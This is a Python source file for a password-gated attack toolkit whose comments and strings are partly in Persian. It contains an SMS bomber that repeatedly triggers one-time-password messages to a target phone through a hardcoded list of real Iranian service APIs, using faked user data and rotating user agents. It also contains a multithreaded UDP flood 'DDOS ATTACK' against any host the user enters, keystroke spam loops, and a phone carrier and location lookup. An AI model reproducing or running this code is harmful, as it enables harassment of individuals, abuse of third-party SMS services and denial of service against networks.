import pyautogui as p
import time
from colorama import Fore, init
from phonenumbers import parse, geocoder, carrier, NumberParseException
import requests
from datetime import datetime
import os
import json
import random
import string
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
from fake_useragent import UserAgent
import subprocess
import platform
import socket
import sys
import _thread

# ==================== Setup ====================
init(autoreset=True)
k = "AS01"     # main key
k2 = "BENIjoon"    # password for option 3 (ULTIMATE SMS BOMBER)
ddos_pass = "STALIN"  # password for DDOS Attack
LOG_PATH = "requests_log.txt"

# غیرفعال کردن هشدارهای SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== SMS Bomber Class ====================
class UltimateSMSSender:
    def __init__(self):
        self.session = requests.Session()
        self.ua = UserAgent()
        self.setup_headers()
        self.results = []
        self.lock = threading.Lock()
        self.running = True
        self.cycle_count = 0
        self.success_count = 0
        self.total_requests = 0
        
    def setup_headers(self):
        self.session.headers.update({
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
        })
        self.session.verify = False

    def get_random_headers(self):
        return {
            "User-Agent": self.ua.random,
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
        }

    def generate_realistic_data(self, phone):
        first_names = ["علی", "محمد", "رضا", "حسین", "امیر", "سارا", "مریم", "فاطمه", "پارسا", "نیما"]
        last_names = ["محمدی", "احمدی", "کریمی", "حسینی", "رضایی", "جعفری", "موسوی", "نجفی"]
        
        return {
            "first_name": random.choice(first_names),
            "last_name": random.choice(last_names),
            "email": f"user{random.randint(1000,9999)}@gmail.com",
            "device_id": ''.join(random.choices(string.hexdigits, k=16)).lower(),
            "timestamp": int(time.time()),
            "request_id": ''.join(random.choices(string.digits, k=8)),
            "random_id": random.randint(100000, 999999)
        }

    def format_phone(self, phone, format_type):
        if phone.startswith('+98'):
            clean_phone = phone
            local_phone = phone[3:]
        elif phone.startswith('09'):
            clean_phone = f"+98{phone[1:]}"
            local_phone = phone
        else:
            return phone
            
        if format_type == "international":
            return clean_phone
        elif format_type == "local":
            return local_phone
        elif format_type == "no_zero":
            return local_phone[1:] if local_phone.startswith('0') else local_phone
        elif format_type == "98_prefix":
            return f"98{local_phone[1:]}" if local_phone.startswith('0') else local_phone
        elif format_type == "0098":
            return f"0098{local_phone[1:]}" if local_phone.startswith('0') else f"0098{local_phone}"
        else:
            return local_phone

    def send_single_api(self, api_config, phone):
        try:
            formatted_phone = self.format_phone(phone, api_config.get("format", "local"))
            url = api_config["url"]
            method = api_config.get("method", "POST")
            name = api_config["name"]
            
            headers = self.get_random_headers()
            timeout = api_config.get("timeout", 6)
            
            if method == "POST":
                payload = self.prepare_payload(api_config.get("payload_template", {}), formatted_phone, phone)
                response = self.session.post(url, json=payload, headers=headers, timeout=timeout, verify=False)
            else:
                params = self.prepare_params(api_config.get("params_template", {}), formatted_phone, phone)
                response = self.session.get(url, params=params, headers=headers, timeout=timeout, verify=False)
            
            success = self.analyze_response(response, name)
            
            result = {
                "api": name,
                "success": success,
                "status_code": response.status_code,
                "timestamp": datetime.now().isoformat()
            }
            
        except Exception as e:
            result = {"api": api_config["name"], "success": False, "error": str(e)[:50], "timestamp": datetime.now().isoformat()}
        
        with self.lock:
            self.results.append(result)
            self.total_requests += 1
            if result["success"]:
                self.success_count += 1
        
        return result

    def prepare_payload(self, template, formatted_phone, original_phone):
        if not template:
            return {}
            
        fake_data = self.generate_realistic_data(original_phone)
        payload_str = json.dumps(template)
        
        replacements = {
            "{phone}": formatted_phone,
            "{original_phone}": original_phone,
            "{first_name}": fake_data["first_name"],
            "{last_name}": fake_data["last_name"],
            "{email}": fake_data["email"],
            "{device_id}": fake_data["device_id"],
            "{timestamp}": str(fake_data["timestamp"]),
            "{request_id}": fake_data["request_id"],
            "{random_id}": str(fake_data["random_id"]),
        }
        
        for key, value in replacements.items():
            payload_str = payload_str.replace(key, value)
        
        return json.loads(payload_str)

    def prepare_params(self, template, formatted_phone, original_phone):
        if not template:
            return {}
            
        params = template.copy()
        for key, value in params.items():
            if isinstance(value, str):
                params[key] = value.replace("{phone}", formatted_phone)
        return params

    def analyze_response(self, response, api_name):
        if response.status_code in [200, 201, 202]:
            return True
            
        try:
            response_data = response.json()
            if isinstance(response_data, dict):
                success_keys = ["success", "status", "ok", "result", "sent", "verified"]
                for key in success_keys:
                    if key in response_data and response_data[key]:
                        return True
        except:
            pass
            
        return False

    def send_all_apis_simultaneous(self, phone):
        print(Fore.CYAN + f"Launching {len(REAL_APIS)} APIs simultaneously...")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {
                executor.submit(self.send_single_api, api_config, phone): api_config["name"] 
                for api_config in REAL_APIS
            }
            
            completed = 0
            for future in as_completed(futures):
                try:
                    result = future.result()
                    completed += 1
                    status_color = Fore.GREEN if result["success"] else Fore.RED
                    print(f"   {status_color} {result['api']}: Status {result.get('status_code', 'N/A')}")
                    print(Fore.CYAN + f"   Progress: {completed}/{len(REAL_APIS)}", end='\r')
                except Exception as e:
                    print(Fore.RED + f"   Error: {e}")
        
        end_time = time.time()
        duration = end_time - start_time
        
        return duration

    def continuous_bombing(self, phone, interval=10):
        self.cycle_count = 0
        
        print(Fore.YELLOW + f"STARTING CONTINUOUS BOMBING ON: {phone}")
        print(Fore.CYAN + f"   Interval: {interval} seconds")
        print(Fore.CYAN + f"   Total APIs: {len(REAL_APIS)}")
        print(Fore.CYAN + f"   Mode: SIMULTANEOUS (All APIs at once)")
        print(Fore.YELLOW + "   Press Ctrl+C to stop\n")
        
        while self.running:
            self.cycle_count += 1
            
            print(Fore.CYAN + f"\n{'='*70}")
            print(Fore.YELLOW + f"CYCLE {self.cycle_count} - {datetime.now().strftime('%H:%M:%S')}")
            print(Fore.CYAN + f"{'='*70}")
            
            duration = self.send_all_apis_simultaneous(phone)
            
            recent_results = self.results[-len(REAL_APIS):]
            cycle_success = sum(1 for r in recent_results if r["success"])
            
            print(Fore.GREEN + f"\nCYCLE {self.cycle_count} COMPLETED!")
            print(Fore.GREEN + f"   Successful: {cycle_success}/{len(REAL_APIS)}")
            print(Fore.RED + f"   Failed: {len(REAL_APIS) - cycle_success}/{len(REAL_APIS)}")
            print(Fore.YELLOW + f"   Duration: {duration:.2f} seconds")
            print(Fore.CYAN + f"   Success Rate: {(cycle_success/len(REAL_APIS))*100:.1f}%")
            
            total_success_rate = (self.success_count / self.total_requests) * 100 if self.total_requests > 0 else 0
            print(Fore.YELLOW + f"\nOVERALL STATISTICS:")
            print(Fore.CYAN + f"   Total Cycles: {self.cycle_count}")
            print(Fore.CYAN + f"   Total Requests: {self.total_requests}")
            print(Fore.GREEN + f"   Total Success: {self.success_count}")
            print(Fore.CYAN + f"   Overall Success Rate: {total_success_rate:.1f}%")
            
            if self.running:
                wait_time = max(0, interval - duration)
                if wait_time > 0:
                    print(Fore.YELLOW + f"\nNext cycle in {wait_time:.1f} seconds...")
                    for i in range(int(wait_time)):
                        if not self.running:
                            break
                        print(Fore.CYAN + f"   {int(wait_time) - i} seconds remaining", end='\r')
                        time.sleep(1)
                    print("   " + " " * 30)

    def stop_sending(self):
        self.running = False

    def get_statistics(self):
        return {
            "total_cycles": self.cycle_count,
            "total_requests": self.total_requests,
            "successful": self.success_count,
            "failed": self.total_requests - self.success_count,
            "success_rate": (self.success_count/self.total_requests)*100 if self.total_requests > 0 else 0
        }

# ==================== DDOS Attack Function ====================
def start_ddos_attack():
    print(Fore.RED + "DDOS ATTACK MODE ACTIVATED")
    print(Fore.YELLOW + "Use responsibly and only on authorized systems!")
    
    try:
        host = input(Fore.CYAN + "Enter Host: ")
        port = int(input(Fore.CYAN + "Enter Target port: "))
        
        bs = random._urandom(1490)
        time.sleep(1)
        
        ip = socket.gethostbyname(host)
        print(Fore.RED + "=============================================================================\n")
        print(Fore.GREEN + f"Target IP: {ip}")
        time.sleep(1)
        print(Fore.GREEN + f"\nTarget port: {port}")
        print(Fore.RED + "=============================================================================\n")
        time.sleep(2)
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        
        def run(k):
            while True:
                sock.sendto(bs,(ip,port))
                print(f"{Fore.GREEN}Send Packet To {Fore.RED}{ip}{Fore.WHITE}")
                
        for i in range(10):
            ch = threading.Thread(target=run, args=[i])
            ch.start()
            
        print(Fore.YELLOW + "DDOS Attack is running...")
        print(Fore.YELLOW + "Press Ctrl+C to stop the attack\n")
        
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print(Fore.RED + "DDOS Attack Stopped by User!")
    except socket.gaierror:
        print(Fore.RED + "Error: Could not resolve hostname")
    except ValueError:
        print(Fore.RED + "Error: Invalid port number")
    except Exception as e:
        print(Fore.RED + f"Unexpected error: {e}")

# لیست API های واقعی
REAL_APIS = [
    {
        "name": "Snapp Taxi",
        "url": "https://app.snapp.taxi/api/api-passenger-oauth/v3/mutotp",
        "method": "POST",
        "format": "international",
        "payload_template": {
            "cellphone": "{phone}",
            "attestation": {"method": "skip", "platform": "skip"},
            "extra_methods": []
        }
    },
    {
        "name": "Snapp.ir", 
        "url": "https://api.snapp.ir/api/v1/sms/link",
        "method": "POST",
        "format": "local",
        "payload_template": {"phone": "{phone}"}
    },
    {
        "name": "Divar",
        "url": "https://api.divar.ir/v5/auth/authenticate",
        "method": "POST", 
        "format": "local",
        "payload_template": {"phone": "{phone}"}
    },
    {
        "name": "Sheypoor",
        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
        "method": "POST",
        "format": "local", 
        "payload_template": {"username": "{phone}"}
    },
    {
        "name": "Torob",
        "url": "https://api.torob.com/v4/user/phone/send-pin/",
        "method": "GET",
        "format": "local",
        "params_template": {
            "phone_number": "{phone}",
            "_http_referrer": "https://www.google.com/",
            "source": "next_desktop"
        }
    },
    {
        "name": "GAP",
        "url": "https://core.gap.im/v1/user/sendOTP.gap",
        "method": "POST",
        "format": "local",
        "payload_template": {"mobile": "{phone}"}
    },
    {
        "name": "Pinket", 
        "url": "https://pinket.com/api/cu/v2/phone-verification",
        "method": "POST",
        "format": "local",
        "payload_template": {"phoneNumber": "{phone}"}
    },
    {
        "name": "Jabama",
        "url": "https://gw.jabama.com/api/v4/account/send-code", 
        "method": "POST",
        "format": "local",
        "payload_template": {"mobile": "{phone}"}
    },
    {
        "name": "Dastaneman",
        "url": "https://dastaneman.com/User/SendCode",
        "method": "POST",
        "format": "no_zero",
        "payload_template": {
            "success": True,
            "mobile": "0098{phone}",
            "duration": 3
        }
    },
    {
        "name": "Virgool",
        "url": "https://virgool.io/api2/app/auth/user-existence", 
        "method": "POST",
        "format": "no_zero",
        "payload_template": {
            "username": "+98{phone}",
            "type": "register", 
            "method": "phone"
        }
    }
]

# ------------------ Safe logging ------------------
def log_entry(entry, path=LOG_PATH):
    try:
        entry_str = str(entry)
        if len(entry_str) > 2000:
            entry_str = entry_str[:2000] + "...(truncated)"
        ts = datetime.utcnow().isoformat(timespec='seconds') + "Z"
        dirpath = os.path.dirname(os.path.abspath(path))
        if dirpath and not os.path.exists(dirpath):
            os.makedirs(dirpath, exist_ok=True)
        with open(path, "a", encoding="utf-8") as lf:
            lf.write(f"{ts}\t{entry_str}\n")
    except Exception as e:
        print(Fore.RED + f"Failed to write log: {e}")

# ------------------ Pause & spacing ------------------
def pause_and_spacing(prompt="Press Enter to return to menu..."):
    input(Fore.YELLOW + prompt)
    print("\n" * 6)
    print(Fore.CYAN + "-----------------------------------")
    print("\n")

# ==================== Main Program ====================
print(Fore.RED + "===================================")
print(Fore.RED + "           WELCOME TO AS01          ")
print(Fore.RED + "===================================\n")

a = input(Fore.YELLOW + "Enter the KEY: ")

if a == k:
    while True:
        # -------- Menu --------
        print(Fore.CYAN + "\nChoices:")
        print(Fore.GREEN + "1 - spam1 (type your text)")
        print(Fore.GREEN + "2 - spam2 (use text file)")
        print(Fore.YELLOW + "3 - ULTIMATE SMS BOMBER")
        print(Fore.CYAN + "4 - SIM (Phone info)")
        print(Fore.RED + "5 - DDOS ATTACK")
        print(Fore.CYAN + "0 - Exit program")
        b = input(Fore.YELLOW + "ENTER YOUR CHOICE: ")

        # -------- Option 1 --------
        if b == "1":
            print(Fore.GREEN + "\n[SPAM1] Program started...\n")
            x = input(Fore.CYAN + "Enter your message: ")
            try:
                y = int(input(Fore.CYAN + "How many times: "))
            except ValueError:
                print(Fore.RED + "Invalid number. Returning to menu.")
                pause_and_spacing()
                continue
            time.sleep(3)
            p.FAILSAFE = False
            for i in range(y):
                p.typewrite(x)
                p.press('enter')
            print(Fore.GREEN + "\nDone! Messages sent.\n")
            pause_and_spacing()

        # -------- Option 2 --------
        elif b == "2":
            print(Fore.GREEN + "\n[SPAM2] Program started...\n")
            time.sleep(1)
            try:
                y = open("your text.txt", 'r', encoding="utf-8", errors="ignore")
                p.FAILSAFE = False
                time.sleep(5)
                for i in y:
                    p.typewrite(i.rstrip("\n"))
                    p.press('enter')
                y.close()
                print(Fore.GREEN + "\nDone! File messages sent.\n")
            except FileNotFoundError:
                print(Fore.RED + "File not found: your text")
            except Exception as e:
                print(Fore.RED + f"Error reading file: {e}")
            pause_and_spacing()

        # -------- Option 3: ULTIMATE SMS BOMBER --------
        elif b == "3":
            pwd = input(Fore.YELLOW + "Enter password for Ultimate SMS Bomber: ").strip()
            if pwd != k2:
                print(Fore.RED + "Wrong password. Returning to menu.")
                pause_and_spacing()
                continue

            target = input(Fore.YELLOW + "Enter phone number (+98xxxxxx or 09xxxxxx): ").strip()
            if not target or len(target) < 6:
                print(Fore.RED + "Invalid phone. Returning to menu.")
                pause_and_spacing()
                continue

            try:
                sender = UltimateSMSSender()
                print(Fore.YELLOW + "\nStarting Ultimate SMS Bomber...")
                print(Fore.YELLOW + "Press Ctrl+C to stop bombing\n")
                
                sender.continuous_bombing(target, interval=10)
                
            except KeyboardInterrupt:
                print(Fore.RED + f"\nSTOPPING BOMBING...")
                sender.stop_sending()
                
                stats = sender.get_statistics()
                print(Fore.CYAN + f"\nFINAL BOMBING STATISTICS:")
                print(Fore.CYAN + f"{'='*50}")
                print(Fore.YELLOW + f"   Total Cycles: {stats['total_cycles']}")
                print(Fore.YELLOW + f"   Total Requests: {stats['total_requests']}")
                print(Fore.GREEN + f"   Total Success: {stats['successful']}")
                print(Fore.RED + f"   Total Failed: {stats['failed']}")
                print(Fore.CYAN + f"   Overall Success Rate: {stats['success_rate']:.1f}%")
                print(Fore.CYAN + f"{'='*50}")
                
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"bombing_results_{timestamp}.json"
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(sender.results, f, indent=2, ensure_ascii=False)
                print(Fore.GREEN + f"Results saved to {filename}")
                
            except Exception as e:
                print(Fore.RED + f"Error in SMS Bomber: {e}")
            
            pause_and_spacing()

        # -------- Option 4: SIM info --------
        elif b == "4":
            try:
                Phonenumber = input(Fore.CYAN + "Enter the phone number: ")
                number = parse(Phonenumber)
                desc = geocoder.description_for_number(number, 'en')
                car = carrier.name_for_number(number, 'en')
                print(Fore.GREEN + f"\nLocation: {desc}")
                print(Fore.GREEN + f"Carrier: {car}\n")
            except NumberParseException:
                print(Fore.RED + "Invalid phone number format.")
            pause_and_spacing()

        # -------- Option 5: DDOS ATTACK --------
        elif b == "5":
            pwd_ddos = input(Fore.YELLOW + "Enter password for DDOS Attack: ").strip()
            if pwd_ddos != ddos_pass:
                print(Fore.RED + "Wrong password. Returning to menu.")
                pause_and_spacing()
                continue

            start_ddos_attack()
            pause_and_spacing()

        # -------- Exit --------
        elif b == "0":
            print(Fore.GREEN + "\nExiting program. Goodbye!")
            break

        else:
            print(Fore.RED + "Invalid choice! Try again.")
            pause_and_spacing()

else:
    print(Fore.RED + "SISHTIR BABA")
    input(Fore.YELLOW + "Press Enter to exit...")

